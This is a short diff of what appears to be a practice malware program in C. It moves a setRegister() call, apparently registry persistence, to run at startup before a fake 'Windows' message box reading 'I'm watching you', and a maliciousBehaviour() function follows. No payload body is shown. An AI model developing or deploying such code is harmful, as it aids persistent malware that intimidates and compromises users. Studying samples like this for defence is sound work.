@@ -65,6 +65,9 @@ int main()
         return -1;
     }
 
+    setRegister();
+    g_Sleep(1000);
+    
     //show messageBox
     if (g_MessageBoxA(NULL, "I'm watching you", "Windows", MB_OKCANCEL) == IDCANCEL)
     {
@@ -86,7 +89,7 @@ int main()
         //sleep 2 seconds
         g_Sleep(2000);
     }
-    setRegister();
+    
     return 0;
 }
 void maliciousBehaviour() {
